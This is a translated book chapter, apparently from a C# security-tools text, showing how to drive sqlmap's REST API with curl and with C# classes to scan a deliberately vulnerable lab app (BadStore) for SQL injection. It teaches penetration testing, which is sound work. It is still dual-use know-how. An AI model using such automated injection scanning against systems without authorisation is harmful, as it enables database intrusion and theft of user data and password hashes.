# 第九章

9

自动化 SQLMAP

![](img/00010.jpg)

本章中，我们制作了自动化利用 SQL 注入漏洞的工具。我们使用 sqlmap —— 一款流行的工具，你将在本章中学习 —— 来首先找到并验证易受 SQL 注入攻击的 HTTP 参数。之后，我们将该功能与我们在 第三章 中创建的 SOAP fuzzer 结合，自动验证易受攻击的 SOAP 服务中的潜在 SQL 注入漏洞。sqlmap 配备了一个 REST API，这意味着它使用 HTTP GET、PUT、POST 和 DELETE 请求来处理数据，并通过特殊的 URI 来引用数据库中的资源。我们在 第五章 中自动化了 Nessus 时也使用了 REST API。

sqlmap API 还使用 JSON 来读取发送到 API URL（在 REST 术语中称为端点）的 HTTP 请求中的对象。JSON 类似于 XML，它允许两个程序以标准方式交换数据，但它比 XML 更简洁、轻量。通常，sqlmap 是通过命令行手动使用的，但通过编程调用 JSON API 可以让你自动化更多任务，比普通的渗透测试工具更高效，从自动检测易受攻击的参数到利用它们。

sqlmap 是用 Python 编写的一个积极开发的工具，可在 GitHub 上找到，网址为 [`github.com/sqlmapproject/sqlmap/`](https://github.com/sqlmapproject/sqlmap/)。你可以通过 git 或下载当前主分支的 ZIP 文件来获取 sqlmap。运行 sqlmap 需要安装 Python（在大多数 Linux 发行版中，通常会默认安装）。

如果你偏好 git，以下命令将检出最新的主分支：$ git clone https://github.com/sqlmapproject/sqlmap.git 如果你偏好 wget，你可以下载最新主分支的 ZIP 压缩包，如下所示：$ wget https://github.com/sqlmapproject/sqlmap/archive/master.zip

$ unzip master.zip 为了跟随本章的示例，你还应安装一个 JSON 序列化框架，如开源选项 Json.NET。你可以从 [`github.com/JamesNK/Newtonsoft.Json`](https://github.com/JamesNK/Newtonsoft.Json) 下载，或者使用大多数 C# IDE 中可用的 NuGet 包管理器。我们在 第二章 和 第五章 中曾使用过此库。

运行 sqlmap

大多数安全工程师和渗透测试人员使用 Python 脚本 sqlmap.py（位于 sqlmap 项目的根目录或系统范围内安装）从命令行驱动 sqlmap。我们将在深入探讨 API 之前简要介绍 sqlmap 命令行工具的工作原理。Kali 已安装 sqlmap，因此你可以在系统的任何位置直接调用 sqlmap。虽然 sqlmap 命令行工具具有与 API 相同的总体功能，但在与其他代码集成时，直接调用命令行工具并不如通过 API 编程调用那样安全和灵活。

注意

> 如果你没有运行 Kali，可能已经下载了 sqlmap 但没有在系统上安装它。你仍然可以通过进入 sqlmap 所在的目录，并使用以下代码直接通过 Python 调用 sqlmap.py 脚本来使用 sqlmap，而无需将其系统范围安装：
> 
> $ python ./sqlmap.py [.. args ..]

一个典型的 sqlmap 命令可能如下所示，类似于清单 9-1 中的代码。

> $ sqlmap ➊--method=GET --level=3 --technique=b ➋--dbms=mysql \
> 
> ➌-u "http://10.37.129.3/cgi-bin/badstore.cgi?searchquery=fdsa&action=search"

清单 9-1：运行 BadStore 的示例 sqlmap 命令

我们目前不会涵盖清单 9-1 的输出，但请注意命令的语法。在这个清单中，我们传递给 sqlmap 的参数告诉它我们希望它测试一个特定的 URL（最好是一个熟悉的 URL，像我们在第二章中用 BadStore 测试的那个）。我们告诉 sqlmap 使用 GET 作为 HTTP 方法➊，并专门使用 MySQL➋负载（而不是包含 PostgreSQL 或 Microsoft SQL Server 的负载），然后是我们希望测试的 URL➌。你可以使用的 sqlmap 脚本参数只有一个小子集。如果你想手动尝试其他命令，可以在[`github.com/sqlmapproject/sqlmap/wiki/Usage/`](https://github.com/sqlmapproject/sqlmap/wiki/Usage/)找到更详细的信息。我们可以使用 sqlmap REST API 来实现与清单 9-1 中 sqlmap 命令相同的功能。

在运行 sqlmapapi.py API 示例时，你可能需要与 sqlmap 工具不同的方式来运行 API 服务器，因为它可能不像 sqlmap.py 脚本那样安装，可以像在 Kali 中那样从系统 shell 调用。如果你需要下载 sqlmap 以便使用 sqlmap API，你可以在 GitHub 上找到它([`github.com/sqlmapproject/sqlmap/`](https://github.com/sqlmapproject/sqlmap/))。

sqlmap REST API

关于 sqlmap REST API 的官方文档有些简略，但本书涵盖了使用它所需的所有内容。首先，运行 sqlmapapi.py --server（位于你之前下载的 sqlmap 项目目录的根目录）以启动 sqlmap API 服务器，监听 127.0.0.1（默认端口为 8775），如清单 9-2 所示。

> $ ./sqlmapapi.py --server
> 
> [22:56:24] [INFO] 正在运行 REST-JSON API 服务器，地址为'127.0.0.1:8775'..
> 
> [22:56:24] [INFO] 管理员 ID: 75d9b5817a94ff9a07450c0305c03f4f
> 
> [22:56:24] [DEBUG] IPC 数据库: /tmp/sqlmapipc-34A3Nn
> 
> [22:56:24] [DEBUG] REST-JSON API 服务器已连接至 IPC 数据库 列表 9-2: 启动 sqlmap 服务器

sqlmap 有几个 REST API 端点，我们需要使用它们来创建自动化工具。为了使用 sqlmap，我们需要创建任务，然后使用 API 请求来处理这些任务。大多数可用的端点使用 GET 请求，旨在检索数据。要查看可用的 GET API 端点，可以在 sqlmap 项目根目录下运行 rgrep "@get"，如列表 9-3 所示。此命令列出了许多可用的 API 端点，它们是 API 中用于某些操作的特殊 URL。

> $ rgrep "@get" .
> 
> lib/utils/api.py:@get("/task/new➊")
> 
> lib/utils/api.py:@get("/task/taskid/delete➋")
> 
> lib/utils/api.py:@get("/admin/taskid/list")
> 
> lib/utils/api.py:@get("/admin/taskid/flush")
> 
> lib/utils/api.py:@get("/option/taskid/list")
> 
> lib/utils/api.py:@get("/scan/taskid/stop➌")
> 
> --snip--

列表 9-3: 可用的 sqlmap REST API GET 请求

很快我们将介绍如何使用 API 端点来创建➊、停止➌和删除➋sqlmap 任务。你可以将此命令中的@get 替换为@post，以查看 API 的可用端点，处理 POST 请求。只有三个 API 调用需要 HTTP POST 请求，如列表 9-4 所示。

> $ rgrep "@post" .
> 
> lib/utils/api.py:@post("/option/taskid/get")
> 
> lib/utils/api.py:@post("/option/taskid/set")
> 
> lib/utils/api.py:@post("/scan/taskid/start") 列表 9-4: 用于 POST 请求的 REST API 端点

在使用 sqlmap API 时，我们需要创建一个任务，以测试给定的 URL 是否存在 SQL 注入。任务通过其任务 ID 来标识，我们将在列表 9-3 和 9-4 中的 API 选项中用任务 ID 替换 taskid。我们可以使用 curl 测试 sqlmap 服务器，确保它正常运行，并且对 API 的行为和返回的数据有所了解。这将帮助我们更好地理解当我们开始编写 sqlmap 类时，我们的 C#代码将如何工作。

使用 curl 测试 sqlmap API

通常，sqlmap 是在命令行中通过我们在本章之前讨论过的 Python 脚本运行的，但 Python 命令会隐藏 sqlmap 在后台的操作，不能让我们看到每个 API 调用如何工作。为了直接体验使用 sqlmap API，我们将使用 curl，它是一个通常用于发送 HTTP 请求并查看请求响应的命令行工具。例如，列表 9-5 展示了如何通过调用 sqlmap 正在监听的端口来创建一个新的 sqlmap 任务。

> $ curl ➊127.0.0.1:8775/task/new
> 
> {
> 
> ➋"taskid": "dce7f46a991c5238",
> 
> "success": true
> 
> }

列表 9-5: 使用 curl 创建一个新的 sqlmap 任务

这里，端口是 127.0.0.1:8775 ➊。这会在任务 ID 后返回一个新任务 ID，并且跟随一个冒号 ➋。在发送此 HTTP 请求之前，请确保你的 sqlmap 服务器正在运行，正如在示例 9-2 中所示。

在用 curl 向 /task/new 端点发送简单的 GET 请求后，sqlmap 会返回一个新的任务 ID，供我们使用。我们将使用这个任务 ID 进行其他 API 调用，包括启动和停止任务以及获取任务结果。要查看给定任务 ID 所有可用的扫描选项列表，可以调用 /option/taskid/list 端点，并替换为你之前创建的 ID，如示例 9-6 所示。请注意，我们在 API 端点请求中使用的是与示例 9-5 中返回的任务 ID 相同的任务 ID。了解任务的选项对于稍后启动 SQL 注入扫描非常重要。

> $ curl 127.0.0.1:8775/option/dce7f46a991c5238/list
> 
> {
> 
> "options": {
> 
> "crawlDepth": null,
> 
> "osShell": false,
> 
> ➊"getUsers": false,
> 
> ➋"getPasswordHashes": false,
> 
> "excludeSysDbs": false,
> 
> "uChar": null,
> 
> --snip--
> 
> ➌"tech": "BEUSTQ",
> 
> "textOnly": false,
> 
> "commonColumns": false,
> 
> "keepAlive": false
> 
> }
> 
> }

示例 9-6：列出给定任务 ID 的选项

这些任务选项中的每一个都对应于命令行 sqlmap 工具中的命令行参数。这些选项告诉 sqlmap 如何执行 SQL 注入扫描，以及它应该如何利用发现的注入点。在示例 9-6 中展示了其中一个有趣的选项，它用于设置要测试的注入技术（tech）；这里它被设置为默认的 BEUSTQ，测试所有类型的 SQL 注入 ➌。你还可以看到用于导出用户数据库的选项，在这个例子中该选项被关闭 ➊，以及导出密码哈希的选项，这个选项也被关闭 ➋。如果你对所有选项的作用感兴趣，可以在命令行中运行 sqlmap --help 查看选项的描述和用法。

在创建任务并查看其当前设置的选项后，我们可以设置其中一个选项并启动扫描。要设置特定选项，我们需要发送一个 POST 请求，并包含一些数据，告诉 sqlmap 要设置哪些选项。示例 9-7 详细说明了如何使用 curl 启动 sqlmap 扫描以测试新 URL。

> $ curl ➊-X POST ➋-H "Content-Type:application/json" \
> 
> ➌--data '{"url":"http://10.37.129.3/cgi-bin/badstore.cgi?searchquery=fdsa&action=search"}' \
> 
> ➍http://127.0.0.1:8775/scan/dce7f46a991c5238/start
> 
> {
> 
> "engineid": 7181,
> 
> "success": true➎
> 
> }

示例 9-7：使用 sqlmap API 以新选项启动扫描

这个 POST 请求命令看起来与 示例 9-5 中的 GET 请求不同，但实际上非常相似。首先，我们将命令指定为 POST 请求 ➊。然后，我们通过将设置选项的名称放在引号中（例如 "url"），后面跟一个冒号，再加上设置该选项的数据 ➌，来列出要发送到 API 的数据。我们使用 -H 参数定义一个新的 HTTP 头来指定数据的内容类型为 JSON ➋，这确保了 sqlmap 服务器的 Content-Type 头会被正确设置为 application/json MIME 类型。然后，我们使用与 示例 9-6 中的 GET 请求相同的 API 调用格式，发起一个 POST 请求，并指定端点 /scan/taskid/start ➍。

扫描启动后，sqlmap 报告成功 ➎，接下来我们需要获取扫描状态。我们可以使用简单的 curl 命令通过状态端点来实现，如 示例 9-8 所示。

> $ curl 127.0.0.1:8775/scan/dce7f46a991c5238/status
> 
> {
> 
> ➊"status": "terminated",
> 
> "returncode": 0,
> 
> "success": true
> 
> }

示例 9-8: 获取扫描状态

扫描完成后，sqlmap 会将扫描的状态更改为 terminated ➊。扫描终止后，我们可以使用日志端点来检索扫描日志，并查看 sqlmap 在扫描过程中是否发现了任何问题，如 示例 9-9 所示。

> $ curl 127.0.0.1:8775/scan/dce7f46a991c5238/log
> 
> {
> 
> "log": [
> 
> {
> 
> ➊"message": "正在刷新会话文件",
> 
> ➋"level": "INFO",
> 
> ➌"time": "09:24:18"
> 
> },
> 
> {
> 
> "message": "正在测试与目标 URL 的连接",
> 
> "level": "INFO",
> 
> "time": "09:24:18"
> 
> },
> 
> --snip--
> 
> ],
> 
> "success": true
> 
> }

示例 9-9: 请求扫描日志

sqlmap 扫描日志是一个状态数组，每个状态都包括消息 ➊、消息级别 ➋ 和时间戳 ➌。扫描日志让我们能够清楚地看到在对给定 URL 进行 sqlmap 扫描期间发生的事情，包括任何可注入的参数。一旦扫描完成并获得结果，我们应该进行清理以节省资源。当我们完成任务时，可以通过调用 /task/taskid/delete 来删除刚创建的任务，如 示例 9-10 所示。API 中可以自由创建和删除任务，因此可以随意创建新的任务，进行尝试，然后删除它们。

> $ curl 127.0.0.1:8775/task/dce7f46a991c5238/delete➊
> 
> {
> 
> "success": true➋
> 
> }

示例 9-10: 在 sqlmap API 中删除任务

在调用 /task/taskid/delete 端点 ➊ 后，API 将返回任务的状态以及是否成功删除 ➋。现在我们已经掌握了创建、运行和删除 sqlmap 扫描的基本工作流程，可以开始着手编写 C# 类来自动化整个过程。

正在为 sqlmap 创建会话

使用 REST API 不需要身份验证，因此我们可以轻松地使用会话/管理器模式，这是一种类似于前几章中其他 API 模式的简单模式。该模式允许我们将协议的传输（即如何与 API 通信）与协议暴露的功能（即 API 可以做什么）分开。我们将实现 SqlmapSession 和 SqlmapManager 类，以驱动 sqlmap API 自动发现并利用注入漏洞。

我们将首先编写 SqlmapSession 类。该类如 清单 9-11 所示，只需要一个构造函数和两个名为 ExecuteGet() 和 ExecutePost() 的方法。这些方法将完成我们将编写的两个类的大部分工作。它们将发起 HTTP 请求（分别用于 GET 和 POST 请求），使我们的类能够与 sqlmap REST API 进行通信。

> public class ➊SqlmapSession : IDisposable
> 
> {
> 
> private string _host = string.Empty;
> 
> private int _port = 8775; // 默认端口
> 
> public ➋SqlmapSession(string host, int port = 8775)
> 
> {
> 
> _host = host;
> 
> _port = port;
> 
> }
> 
> public string ➌ExecuteGet(string url)
> 
> {
> 
> return string.Empty;
> 
> }
> 
> public string ➍ExecutePost(string url, string data)
> 
> {
> 
> return string.Empty;
> 
> }
> 
> public void ➎Dispose()
> 
> {
> 
> _host = null;
> 
> }
> 
> }

清单 9-11：SqlmapSession 类

我们首先创建一个名为 SqlmapSession ➊ 的公共类，该类将实现 IDisposable 接口。这使我们能够在使用语句中使用 SqlmapSession，从而写出更简洁的代码，并通过垃圾回收管理变量。我们还声明了两个私有字段，一个主机和一个端口，我们将在发起 HTTP 请求时使用它们。我们默认将 _host 变量赋值为 string.Empty。这是 C# 的一项特性，它允许你在不实际实例化字符串对象的情况下将空字符串赋值给变量，从而稍微提高性能（但目前只是为了赋一个默认值）。我们将 _port 变量赋值为 sqlmap 监听的端口，默认为 8775。

在声明私有字段后，我们创建一个构造函数，接受两个参数 ➋：主机和端口。我们将私有字段赋值为传递给构造函数的参数值，以便连接到正确的 API 主机和端口。我们还声明了两个占位方法，用于执行 GET 和 POST 请求，暂时返回 string.Empty。接下来，我们将定义这些方法。ExecuteGet() 方法 ➌ 只需要一个 URL 作为输入。ExecutePost() 方法 ➍ 需要一个 URL 和要发布的数据。最后，我们编写 Dispose() 方法 ➎，这是实现 IDisposable 接口时必需的。在此方法中，我们通过将私有字段的值赋为 null 来清理它们。

创建一个执行 GET 请求的方法

清单 9-12 显示了如何使用 WebRequest 实现两个被占位的方法中的第一个，以执行 GET 请求并返回一个字符串。

> public string ExecuteGet(string url)
> 
> {
> 
> HttpWebRequest req = (HttpWebRequest)WebRequest.➊Create("http://" + _host + ":" + _port + url);
> 
> req.Method = "GET";
> 
> string resp = string.Empty;
> 
> ➋using (StreamReader rdr = new StreamReader(req.GetResponse().GetResponseStream()))
> 
> resp = rdr.➌ReadToEnd();
> 
> return resp;
> 
> }

示例 9-12：ExecuteGet() 方法

我们使用 _host、_port 和 url 变量创建一个 WebRequest ➊ 来构建完整的 URL，并将 Method 属性设置为 GET。接下来，我们执行请求 ➋ 并通过 ReadToEnd() ➌ 将响应读取到字符串中，然后返回给调用方法。当你实现 SqlmapManager 时，你将使用 Json.NET 库来反序列化字符串中返回的 JSON，以便轻松提取其中的值。反序列化是将字符串转换为 JSON 对象的过程，而序列化是相反的过程。

执行 POST 请求

ExecutePost() 方法比 ExecuteGet() 方法稍微复杂一些。由于 ExecuteGet() 只能发起简单的 HTTP 请求，ExecutePost() 允许我们发送包含更多数据（如 JSON）的复杂请求。它还将返回一个包含 JSON 响应的字符串，该字符串将被 SqlmapManager 反序列化。示例 9-13 展示了如何实现 ExecutePost() 方法。

> public string ExecutePost(string url, string data)
> 
> {
> 
> byte[] buffer = ➊Encoding.ASCII.GetBytes(data);
> 
> HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://"+_host+":"+_port+url);
> 
> req.Method = "POST"➋;
> 
> req.ContentType = "application/json"➌;
> 
> req.ContentLength = buffer.Length;
> 
> using (Stream stream = req.GetRequestStream())
> 
> stream.➍Write(buffer, 0, buffer.Length);
> 
> string resp = string.Empty;
> 
> using (StreamReader r = new StreamReader(req.GetResponse().GetResponseStream()))
> 
> resp = r.➎ReadToEnd();
> 
> return resp;
> 
> }

示例 9-13：ExecutePost() 方法

这与我们在第二章和第三章进行 POST 请求模糊测试时写的代码非常相似。此方法需要两个参数：一个绝对 URI 和要发送到方法的数据。Encoding 类 ➊（在 System.Text 命名空间中可用）用于创建表示要发送数据的字节数组。然后，我们创建一个 WebRequest 对象并像在 ExecuteGet() 方法中一样进行设置，只是我们将 Method 设置为 POST ➋。注意，我们还指定了 ContentType 为 application/json ➌，并且 ContentLength 匹配字节数组的长度。由于我们将发送 JSON 数据到服务器，因此我们需要在 HTTP 请求中设置适当的内容类型和数据长度。WebRequest 设置完成后，我们通过 ➍ 将字节数组写入请求的 TCP 流（即计算机与 HTTP 服务器之间的连接），将 JSON 数据作为 HTTP 请求体发送到服务器。最后，我们将 HTTP 响应读取 ➎ 为一个字符串，并返回给调用方法。

测试 Session 类

现在我们准备编写一个小应用程序，在`Main()`方法中测试新的 SqlmapSession 类。我们将创建一个新任务，调用我们的方法，然后删除该任务，如清单 9-14 所示。

> public static void Main(string[] args)
> 
> {
> 
> string host = ➊args[0];
> 
> int port = int.Parse(args[1]);
> 
> using (SqlmapSession session = new ➋SqlmapSession(host, port))
> 
> {
> 
> string response = session.➌ExecuteGet("/task/new");
> 
> JToken token = JObject.Parse(response);
> 
> string taskID = token.➍SelectToken("taskid").ToString();
> 
> ➎Console.WriteLine("新任务 ID: " + taskID);
> 
> Console.WriteLine("正在删除任务: " + taskID);
> 
> ➏response = session.ExecuteGet("/task/" + taskID + "/delete");
> 
> token = JObject.Parse(response);
> 
> bool success = (bool)token.➐SelectToken("success");
> 
> Console.WriteLine("删除成功: " + success);
> 
> }
> 
> }

清单 9-14：我们 sqlmap 控制台应用程序的 Main()方法

Json.NET 库使得在 C#中处理 JSON 变得简单（如你在第五章中看到的）。我们从程序传入的第一个和第二个参数分别获取 host 和 port➊。然后我们使用 int.Parse()将字符串参数解析为整数形式的端口。尽管我们在这一整章中一直使用端口 8775，但由于端口是可配置的（8775 只是默认值），我们不应该假设它总是 8775。当我们为变量赋值后，我们使用传入程序的参数实例化一个新的 SqlmapSession➋。然后我们调用/task/new 端点➌来获取一个新的任务 ID，并使用 JObject 类解析返回的 JSON。一旦解析了响应，我们使用 SelectToken()方法➍来获取 taskid 键的值，并将该值赋给 taskID 变量。

注意

> C#中的一些标准类型具有 Parse()方法，就像我们刚才使用的 int.Parse()方法一样。int 类型是 Int32，因此它将尝试解析一个 32 位整数。Int16 是短整数，因此 short.Parse()将尝试解析一个 16 位整数。Int64 是长整数，long.Parse()将尝试解析一个 64 位整数。DateTime 类上也有一个有用的 Parse()方法。这些方法都是静态的，因此不需要实例化对象。

在将新任务 ID 打印到控制台➎后，我们可以通过调用/task/taskid/delete 端点➏来删除任务。我们再次使用 JObject 类来解析 JSON 响应，然后获取 success 键的值➐，将其转换为布尔值，并赋值给 success 变量。这个变量会被打印到控制台，显示任务是否成功删除。当你运行该工具时，它会输出关于创建和删除任务的内容，如清单 9-15 所示。

> $ mono ./ch9_automating_sqlmap.exe 127.0.0.1 8775
> 
> 新任务 ID: 96d9fb9d277aa082
> 
> 删除任务: 96d9fb9d277aa082
> 
> 删除成功: True 清单 9-15：运行创建 sqlmap 任务并删除它的程序

一旦我们知道可以成功创建和删除任务，我们就可以创建 SqlmapManager 类来封装未来我们想要使用的 API 功能，例如设置扫描选项和获取扫描结果。

SqlmapManager 类

SqlmapManager 类，如列表 9-16 所示，封装了通过 API 暴露的方法，以一种易于使用（并且易于维护！）的方式。当我们完成本章所需的方法编写后，我们可以开始扫描给定的 URL，监控直到完成，然后获取结果并删除任务。我们还将大量使用 Json.NET 库。再重申一遍，session/manager 模式的目标是将 API 的传输与 API 暴露的功能分离。这个模式的一个附加好处是，它允许使用库的程序员专注于结果 API 调用。然而，程序员仍然可以在需要时直接与 session 交互。

> public class ➊SqlmapManager : IDisposable
> 
> {
> 
> private ➋SqlmapSession _session = null;
> 
> public ➌SqlmapManager(SqlmapSession session)
> 
> {
> 
> if (session == null)
> 
> throw new ArgumentNullException("session");
> 
> _session = session;
> 
> }
> 
> public void ➍Dispose()
> 
> {
> 
> _session.Dispose();
> 
> _session = null;
> 
> }
> 
> }

列表 9-16：SqlmapManager 类

我们声明了 SqlmapManager 类 ➊ 并使其实现 IDisposable 接口。我们还声明了一个私有字段 ➋ 用于 SqlmapSession，该字段将在整个类中使用。接着，我们创建了 SqlmapManager 构造函数 ➌，它接受一个 SqlmapSession，并将该 session 分配给私有 _session 字段。

最后，我们实现了 Dispose() 方法 ➍，该方法用于清理私有的 SqlmapSession。你可能会想，为什么我们让 SqlmapSession 和 SqlmapManager 都实现 IDisposable，而在 SqlmapManager 的 Dispose() 方法中，我们又调用了 SqlmapSession 的 Dispose() 方法。一个程序员可能只想实例化一个 SqlmapSession，并直接与它交互，以防有新的 API 端点引入，而该管理器尚未更新以支持这个新端点。让两个类都实现 IDisposable 提供了最大的灵活性。

由于我们在测试 SqlmapSession 类时已经实现了创建新任务和删除现有任务所需的方法（见列表 9-14），我们将在 SqlmapManager 类中将这些操作作为独立的方法添加到 Dispose() 方法之前，如列表 9-17 所示。

> public string NewTask()
> 
> {
> 
> JToken tok = JObject.Parse(_session.ExecuteGet("/task/new"));
> 
> ➊return tok.SelectToken("taskid").ToString();
> 
> }
> 
> public bool DeleteTask(string taskid)
> 
> {
> 
> JToken tok = Jobject.Parse(session.ExecuteGet("/task/" + taskid + "/delete"));
> 
> ➋return (bool)tok.SelectToken("success");
> 
> }

列表 9-17：管理 sqlmap 任务的 NewTask() 和 DeleteTask() 方法

NewTask() 和 DeleteTask() 方法使得在 SqlmapManager 类中按需创建和删除任务变得容易，它们几乎与清单 9-14 中的代码完全相同，唯一不同的是它们打印的输出较少，并且在创建新任务 ➊ 后返回任务 ID，或者在删除任务时返回结果（成功或失败） ➋。

现在我们可以使用这些新方法来重写之前的命令行应用程序，用于测试 SqlmapSession 类，如在清单 9-18 中所见。

> public static void Main(string[] args)
> 
> {
> 
> string host = args[0];
> 
> int port = int.Parse(args[1]);
> 
> using (SqlmapManager mgr = new SqlmapManager(new SqlmapSession(host, port)))
> 
> {
> 
> string taskID = mgr.➊NewTask();
> 
> Console.WriteLine("已创建任务: " + taskID);
> 
> Console.WriteLine("正在删除任务");
> 
> bool success = mgr.➋DeleteTask(taskID);
> 
> Console.WriteLine("删除成功: " + success);
> 
> } //自动清理并释放管理器
> 
> }

清单 9-18：重写应用程序以使用 SqlmapManager 类

这段代码比原始应用程序在清单 9-14 中的代码更易于快速阅读和理解。我们已经用 NewTask() ➊ 和 DeleteTask() ➋ 方法替代了创建和删除任务的代码。仅通过阅读代码，你无法知道 API 使用 HTTP 作为传输协议，或者我们在处理 JSON 响应。

清单 sqlmap 选项

接下来的方法我们将实现（如在清单 9-19 中所示）用于获取任务的当前选项。有一点需要注意的是，由于 sqlmap 是用 Python 编写的，它是弱类型的。这意味着某些响应将包含多种类型的混合，这在 C# 中（它是强类型的）可能有点难以处理。JSON 要求所有键都必须是字符串，但 JSON 中的值可能具有不同的类型，例如整数、浮点数、布尔值和字符串。这意味着我们必须尽可能地将所有值作为通用对象处理，在 C# 中使用简单的对象，直到我们需要知道它们的具体类型。

> public Dictionary<string, object> ➊GetOptions(string taskid)
> 
> {
> 
> Dictionary<string, object> options = ➋new Dictionary<string, object>();
> 
> JObject tok = JObject.➌Parse(_session.ExecuteGet ("/option/" + taskid + "/list"));
> 
> tok = tok["options"] as JObject;
> 
> ➍foreach (var pair in tok)
> 
> options.Add(pair.Key, ➎pair.Value);
> 
> return ➏options;
> 
> }

清单 9-19：GetOptions() 方法

GetOptions()方法➊在第 9-19 节中接受一个参数：用于检索选项的任务 ID。此方法将使用与在第 9-5 节中测试 sqlmap API 时使用的相同 API 端点，我们通过 curl 进行测试。我们通过实例化一个新的 Dictionary ➋开始该方法，该字典要求键是字符串，但允许您将任何类型的对象存储为该对的另一个值。在进行 API 调用到选项端点并解析响应 ➌后，我们遍历从 API 返回的 JSON 响应中的键/值对 ➍并将其添加到选项字典 ➎中。最后，返回任务的当前设置选项 ➏，以便我们可以更新它们并在开始扫描时使用它们。

我们将在稍后实现的 StartTask()方法中使用此选项字典，将选项作为参数传递，以便启动任务。不过，首先，请继续在第 9-20 节中添加以下几行代码到您的控制台应用程序中，这些行应该在调用 mgr.NewTask()后，但在使用 mgr.DeleteTask()删除任务之前。

> Dictionary<string, object> ➊options = mgr.GetOptions(➋taskID);
> 
> ➌ foreach (var pair in options)
> 
> Console.WriteLine("Key: " + pair.Key + "\t:: Value: " + pair.Value); 第 9-20 节：将以下几行添加到主应用程序中，以检索并打印当前任务选项

在这段代码中，任务 ID 作为参数传递给 GetOptions() ➋，返回的选项字典被赋值给一个新的 Dictionary，也叫 options ➊。然后，代码遍历选项并打印出每个键/值对 ➌。添加这些行后，在 IDE 或控制台中重新运行您的应用程序，您应该会看到打印到控制台的完整选项列表以及它们当前的值。这在第 9-21 节中展示。

> $ mono ./ch9_automating_sqlmap.exe 127.0.0.1 8775
> 
> Key: crawlDepth ::Value:
> 
> Key: osShell ::Value: False
> 
> Key: getUsers ::Value: False
> 
> Key: getPasswordHashes ::Value: False
> 
> Key: excludeSysDbs ::Value: False
> 
> Key: uChar ::Value:
> 
> Key: regData ::Value:
> 
> Key: prefix ::Value:
> 
> Key: code ::Value:
> 
> --snip--

第 9-21 节：获取选项后打印任务选项到屏幕

现在我们能够看到任务选项了，接下来是时候执行扫描了。

创建执行扫描的方法

现在我们准备好准备任务以执行扫描。在我们的选项字典中，我们有一个键是 url，这就是我们将测试 SQL 注入的 URL。我们将修改后的字典传递给一个新的 StartTask()方法，该方法将字典作为 JSON 对象发布到端点，并在任务开始时使用新的选项。

使用 Json.NET 库使得 StartTask()方法非常简短，因为它为我们处理了所有的序列化和反序列化，就像第 9-22 节所示。

> public bool StartTask(string taskID, Dictionary<string, object> opts)
> 
> {
> 
> string json = JsonConvert.➊SerializeObject(opts);
> 
> JToken tok = JObject.➋Parse(session.ExecutePost("/scan/"+taskID+"/start", json));
> 
> ➌return(bool)tok.SelectToken("success");
> 
> }

清单 9-22：StartTask()方法

我们使用 Json.NET 的 JsonConvert 类将整个对象转换为 JSON。SerializeObject()方法 ➊ 用于获取表示选项字典的 JSON 字符串，我们可以将其发送到端点。然后，我们发出 API 请求并解析 JSON 响应 ➋。最后，我们返回 ➌ JSON 响应中 success 键的值，希望它为 true。此 JSON 键应始终出现在该 API 调用的响应中，当任务成功启动时为 true，如果任务未启动，则为 false。

了解任务是否完成也是很有用的。这样，你就能知道何时可以获取任务的完整日志以及何时删除任务。为了获取任务的状态，我们实现了一个小类（见清单 9-23），该类表示来自/scan/taskid/status API 端点的 sqlmap 状态响应。如果你愿意，可以将其添加到一个新的类文件中，尽管它是一个超短类。

> public class SqlmapStatus
> 
> {
> 
> ➊public string Status { get; set; }
> 
> ➋public int ReturnCode { get; set; }
> 
> }

清单 9-23：SqlmapStatus 类

对于 SqlmapStatus 类，我们不需要定义构造函数，因为默认情况下，每个类都有一个公共构造函数。我们在类中定义了两个公共属性：一个字符串状态消息 ➊ 和一个整数返回代码 ➋。为了获取任务状态并将其存储在 SqlmapStatus 中，我们实现了 GetScanStatus 方法，该方法接受 taskid 作为输入并返回一个 SqlmapStatus 对象。

GetScanStatus() 方法显示在清单 9-24 中。

> public SqlmapStatus GetScanStatus(string taskid)
> 
> {
> 
> JObject tok = JObject.Parse(_session.➊ExecuteGet("/scan/" + taskid + "/status"));
> 
> SqlmapStatus stat = ➋new SqlmapStatus();
> 
> stat.Status = (string)tok["status"];
> 
> if (tok["returncode"].Type != JTokenType.Null➌)
> 
> stat.ReturnCode = (int)tok["returncode"];
> 
> ➍return stat;
> 
> }

清单 9-24：GetScanStatus()方法

我们使用之前定义的 ExecuteGet()方法来检索/scan/taskid/status API 端点 ➊，该端点返回一个包含任务扫描状态信息的 JSON 对象。在调用 API 端点后，我们创建一个新的 SqlmapStatus 对象 ➋，并将 API 调用返回的状态值分配给 Status 属性。如果 returncode 的 JSON 值不为 null ➌，我们将其转换为整数并将结果分配给 ReturnCode 属性。最后，我们返回 ➍ SqlmapStatus 对象给调用者。

新的 Main()方法

现在我们将向命令行应用程序添加逻辑，以便扫描我们在第二章中利用的 BadStore 中的漏洞搜索页面并监控扫描。首先，在调用 DeleteTask 之前，向 Main()方法中添加清单 9-25 中显示的代码。

> options["url"] = ➊"http://192.168.1.75/cgi-bin/badstore.cgi?" +
> 
> "searchquery=fdsa&action=search";
> 
> ➋mgr.StartTask(taskID, options);
> 
> ➌SqlmapStatus status = mgr.GetScanStatus(taskID);
> 
> ➍while (status.Status != "terminated")
> 
> {
> 
> System.Threading.Thread.Sleep(new TimeSpan(0, 0, 10));
> 
> status = mgr.GetScanStatus(taskID);
> 
> }
> 
> ➎ Console.WriteLine("扫描完成！"); Listing 9-25: 在主 sqlmap 应用程序中启动扫描并观察其完成

将 IP 地址 ➊ 替换为你希望扫描的 BadStore 的地址。在应用程序为 options 字典分配 url 键后，它将使用新选项 ➋ 启动任务并获取扫描状态 ➌，该状态应为运行中。然后，应用程序将循环 ➍，直到扫描状态为 terminated，这意味着扫描已经完成。应用程序将在退出循环后打印 "扫描完成！" ➎。 

扫描报告

为了查看 sqlmap 是否能够利用任何脆弱的参数，我们将创建一个 SqlmapLogItem 类来检索扫描日志，如 Listing 9-26 所示。

> public class SqlmapLogItem
> 
> {
> 
> public string Message { get; set; }
> 
> public string Level { get; set; }
> 
> public string Time { get; set; }
> 
> }

Listing 9-26: SqlmapLogItem 类

这个类只有三个属性：Message、Level 和 Time。Message 属性包含描述日志项的消息。Level 控制 sqlmap 在报告中打印的信息量，可能是 Error（错误）、Warn（警告）或 Info（信息）。每个日志项只有这三种级别之一，这使得后续查找特定类型的日志项变得简单（例如，当你只想打印错误而不想显示警告或信息时）。错误通常是致命的，而警告则意味着似乎有问题，但 sqlmap 仍然可以继续进行。信息项仅仅是扫描正在执行的基本信息，或者是它发现的内容，比如正在测试的注入类型。最后，Time 是日志项记录的时间。

